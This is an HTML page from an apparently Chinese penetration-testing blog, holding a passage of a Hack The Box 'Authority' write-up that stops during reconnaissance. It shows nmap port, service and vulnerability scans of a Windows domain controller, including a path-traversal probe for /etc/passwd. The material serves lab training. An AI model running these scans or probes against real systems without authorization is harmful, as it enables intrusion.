<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  Authority | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  Authority</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-26T01:54:24.383Z" id="date"> 2023-07-26</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-27T06:27:37.788Z" id="updated"> 2023-07-27</time></div></span><br><span>Word Count: <div class="control">5.8k</div></span><br><span>Read Time: <div class="control">32 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/zelda8.jpg'><img src="/pic/zelda8.jpg" alt="zelda8"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows靶机打得少，坐大牢。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -p- --min-rate=10000 10.10.11.222<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-25 02:49 EDT<br>Warning: 10.10.11.222 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> authority.htb (10.10.11.222)<br>Host is up (0.078s latency).<br>Not shown: 65472 closed tcp ports (reset), 34 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>53/tcp    open  domain<br>80/tcp    open  http<br>88/tcp    open  kerberos-sec<br>135/tcp   open  msrpc<br>139/tcp   open  netbios-ssn<br>389/tcp   open  ldap<br>445/tcp   open  microsoft-ds<br>464/tcp   open  kpasswd5<br>593/tcp   open  http-rpc-epmap<br>636/tcp   open  ldapssl<br>3268/tcp  open  globalcatLDAP<br>3269/tcp  open  globalcatLDAPssl<br>5985/tcp  open  wsman<br>8443/tcp  open  https-alt<br>9389/tcp  open  adws<br>47001/tcp open  winrm<br>49664/tcp open  unknown<br>49665/tcp open  unknown<br>49666/tcp open  unknown<br>49667/tcp open  unknown<br>49672/tcp open  unknown<br>49685/tcp open  unknown<br>49686/tcp open  unknown<br>49689/tcp open  unknown<br>49690/tcp open  unknown<br>49694/tcp open  unknown<br>49702/tcp open  unknown<br>49711/tcp open  unknown<br>57114/tcp open  unknown<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.38 seconds<br><br>$ sudo nmap -sT -sV -sC -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49672,49685,49686,49689,49690,49694,49702,4971,57114 10.10.11.222<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-25 03:02 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> authority.htb (10.10.11.222)<br>Host is up (0.076s latency).<br><br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>| http-methods:<br>|_  Potentially risky methods: TRACE<br>|_http-title: IIS Windows Server<br>|_http-server-header: Microsoft-IIS/10.0<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-25 11:03:01Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)<br>| ssl-cert: Subject:<br>| Subject Alternative Name: othername: UPN::AUTHORITY<span class="hljs-variable">$@htb</span>.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB<br>| Not valid before: 2022-08-09T23:03:21<br>|_Not valid after:  2024-08-09T23:13:21<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-07-25T11:04:17+00:00; +4h00m02s from scanner time.<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-07-25T11:04:17+00:00; +4h00m02s from scanner time.<br>| ssl-cert: Subject:<br>| Subject Alternative Name: othername: UPN::AUTHORITY<span class="hljs-variable">$@htb</span>.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB<br>| Not valid before: 2022-08-09T23:03:21<br>|_Not valid after:  2024-08-09T23:13:21<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)<br>| ssl-cert: Subject:<br>| Subject Alternative Name: othername: UPN::AUTHORITY<span class="hljs-variable">$@htb</span>.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB<br>| Not valid before: 2022-08-09T23:03:21<br>|_Not valid after:  2024-08-09T23:13:21<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-07-25T11:04:17+00:00; +4h00m02s from scanner time.<br>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-07-25T11:04:16+00:00; +4h00m01s from scanner time.<br>| ssl-cert: Subject:<br>| Subject Alternative Name: othername: UPN::AUTHORITY<span class="hljs-variable">$@htb</span>.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB<br>| Not valid before: 2022-08-09T23:03:21<br>|_Not valid after:  2024-08-09T23:13:21<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>8443/tcp  open  ssl/https-alt<br>| fingerprint-strings:<br>|   FourOhFourRequest, GetRequest:<br>|     HTTP/1.1 200<br>|     Content-Type: text/html;charset=ISO-8859-1<br>|     Content-Length: 82<br>|     Date: Tue, 25 Jul 2023 11:03:07 GMT<br>|     Connection: close<br>|     &lt;html&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;meta http-equiv=<span class="hljs-string">&quot;refresh&quot;</span> content=<span class="hljs-string">&quot;0;URL=&#x27;/pwm&#x27;&quot;</span>/&gt;&lt;/head&gt;&lt;/html&gt;<br>|   HTTPOptions:<br>|     HTTP/1.1 200<br>|     Allow: GET, HEAD, POST, OPTIONS<br>|     Content-Length: 0<br>|     Date: Tue, 25 Jul 2023 11:03:07 GMT<br>|     Connection: close<br>|   RTSPRequest:<br>|     HTTP/1.1 400<br>|     Content-Type: text/html;charset=utf-8<br>|     Content-Language: en<br>|     Content-Length: 1936<br>|     Date: Tue, 25 Jul 2023 11:03:13 GMT<br>|     Connection: close<br>|     &lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;HTTP Status 400<br>|     Request&lt;/title&gt;&lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:<span class="hljs-comment">#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;fnt-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 40</span><br>|_    Request&lt;/h1&gt;&lt;hr class=<span class="hljs-string">&quot;line&quot;</span> /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found <span class="hljs-keyword">in</span> the HTTP protocol [RTSP&amp;<span class="hljs-comment">#47;1.00x0d0x0a0x0d0x0a...]/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invaid</span><br>| ssl-cert: Subject: commonName=172.16.2.118<br>| Not valid before: 2023-07-23T09:37:08<br>|_Not valid after:  2025-07-24T21:15:32<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/plain;charset=UTF-8).</span><br><span class="hljs-string">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="hljs-string">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title: Not Found</span><br><span class="hljs-string">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49672/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49685/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="hljs-string">49689/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49690/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49694/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49702/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">57114/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-servie :</span><br><span class="hljs-string">SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/25%Time=64BF73A9%P=x86_64-pc-linux-gn</span><br><span class="hljs-string">SF:u%r(GetRequest,DB,&quot;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c</span><br><span class="hljs-string">SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Tue,\x2025\x20Ju</span><br><span class="hljs-string">SF:l\x202023\x2011:03:07\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n&lt;</span><br><span class="hljs-string">SF:html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=&#x27;</span>/pwm<span class="hljs-string">&#x27;\&quot;/</span><br><span class="hljs-string">SF:&gt;&lt;/head&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,7D,&quot;HTTP/1\.1\x20200\x20\r\nAllow:\x20G</span><br><span class="hljs-string">SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Tu</span><br><span class="hljs-string">SF:e,\x2025\x20Jul\x202023\x2011:03:07\x20GMT\r\nConnection:\x20close\r\n\</span><br><span class="hljs-string">SF:r\n&quot;)%r(FourOhFourRequest,DB,&quot;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20</span><br><span class="hljs-string">SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Tue,\</span><br><span class="hljs-string">SF:x2025\x20Jul\x202023\x2011:03:07\x20GMT\r\nConnection:\x20close\r\n\r\n</span><br><span class="hljs-string">SF:\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;UR</span><br><span class="hljs-string">SF:L=&#x27;</span>/pwm<span class="hljs-string">&#x27;\&quot;/&gt;&lt;/head&gt;&lt;/html&gt;&quot;)%r(RTSPRequest,82C,&quot;HTTP/1\.1\x20400\x20\r\</span><br><span class="hljs-string">SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\</span><br><span class="hljs-string">SF:nContent-Length:\x201936\r\nDate:\x20Tue,\x2025\x20Jul\x202023\x2011:03</span><br><span class="hljs-string">SF::13\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20la</span><br><span class="hljs-string">SF:ng=\&quot;en\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20</span><br><span class="hljs-string">SF:Request&lt;/title&gt;&lt;style\x20type=\&quot;text/css\&quot;&gt;body\x20&#123;font-family:Tahoma,</span><br><span class="hljs-string">SF:Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;background</span><br><span class="hljs-string">SF:-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-size:16px;&#125;\</span><br><span class="hljs-string">SF:x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;color:bla</span><br><span class="hljs-string">SF:ck;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/s</span><br><span class="hljs-string">SF:tyle&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R</span><br><span class="hljs-string">SF:equest&lt;/h1&gt;&lt;hr\x20class=\&quot;line\&quot;\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception\x20Re</span><br><span class="hljs-string">SF:port&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\x20the</span><br><span class="hljs-string">SF:\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/p&gt;&lt;p&gt;&lt;</span><br><span class="hljs-string">SF:b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr</span><br><span class="hljs-string">SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc</span><br><span class="hljs-string">SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20</span><br><span class="hljs-string">SF:request\x20syntax,\x20invalid\x20&quot;);</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Wndows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)</span><br><span class="hljs-string">No exact OS matches for host (test conditions non-ideal).</span><br><span class="hljs-string">Network Distance: 2 hops</span><br><span class="hljs-string">Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m01s</span><br><span class="hljs-string">| smb2-security-mode:</span><br><span class="hljs-string">|   3:1:1:</span><br><span class="hljs-string">|_    Message signing enabled and required</span><br><span class="hljs-string">| smb2-time:</span><br><span class="hljs-string">|   date: 2023-07-25T11:04:06</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 83.37 seconds</span><br><span class="hljs-string"></span><br><span class="hljs-string">$ sudo nmap --script=vuln 10.10.11.222</span><br><span class="hljs-string">Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-25 23:17 EDT</span><br><span class="hljs-string">Pre-scan script results:</span><br><span class="hljs-string">| broadcast-avahi-dos:</span><br><span class="hljs-string">|   Discovered hosts:</span><br><span class="hljs-string">|     224.0.0.251</span><br><span class="hljs-string">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="hljs-string">|_  Hosts are all up (not vulnerable).</span><br><span class="hljs-string">Nmap scan report for authority.htb (10.10.11.222)</span><br><span class="hljs-string">Host is up (0.075s latency).</span><br><span class="hljs-string">Not shown: 987 closed tcp ports (reset)</span><br><span class="hljs-string">PORT     STATE SERVICE</span><br><span class="hljs-string">53/tcp   open  domain</span><br><span class="hljs-string">80/tcp   open  http</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>88/tcp   open  kerberos-sec<br>135/tcp  open  msrpc<br>139/tcp  open  netbios-ssn<br>389/tcp  open  ldap<br>445/tcp  open  microsoft-ds<br>464/tcp  open  kpasswd5<br>593/tcp  open  http-rpc-epmap<br>636/tcp  open  ldapssl<br>3268/tcp open  globalcatLDAP<br>3269/tcp open  globalcatLDAPssl<br>8443/tcp open  https-alt<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| http-slowloris-check:<br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-phpmyadmin-dir-traversal:</span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion</span><br><span class="hljs-string">|     State: UNKNOWN (unable to test)</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2005-3299</span><br><span class="hljs-string">|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Disclosure date: 2005-10-nil</span><br><span class="hljs-string">|     Extra information:</span><br><span class="hljs-string">|       ../../../../../etc/passwd :</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|   &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&#x27;</span>/pwm<span class="hljs-string">&#x27;&quot;/&gt;&lt;/head&gt;&lt;/html&gt;</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://www.exploit-db.com/exploits/1244/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299</span><br><span class="hljs-string">| ssl-dh-params:</span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Diffie-Hellman Key Exchange Insufficient Group Strength</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       Transport Layer Security (TLS) services that use Diffie-Hellman groups</span><br><span class="hljs-string">|       of insufficient strength, especially those using one of a few commonly</span><br><span class="hljs-string">|       shared groups, may be susceptible to passive eavesdropping attacks.</span><br><span class="hljs-string">|     Check results:</span><br><span class="hljs-string">|       WEAK DH GROUP 1</span><br><span class="hljs-string">|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256</span><br><span class="hljs-string">|             Modulus Type: Safe prime</span><br><span class="hljs-string">|             Modulus Source: RFC2409/Oakley Group 2</span><br><span class="hljs-string">|             Modulus Length: 1024</span><br><span class="hljs-string">|             Generator Length: 8</span><br><span class="hljs-string">|             Public Key Length: 1024</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|_      https://weakdh.org</span><br><span class="hljs-string">|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="hljs-string">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span><br><span class="hljs-string">|_smb-vuln-ms10-054: false</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 314.65 seconds</span><br><span 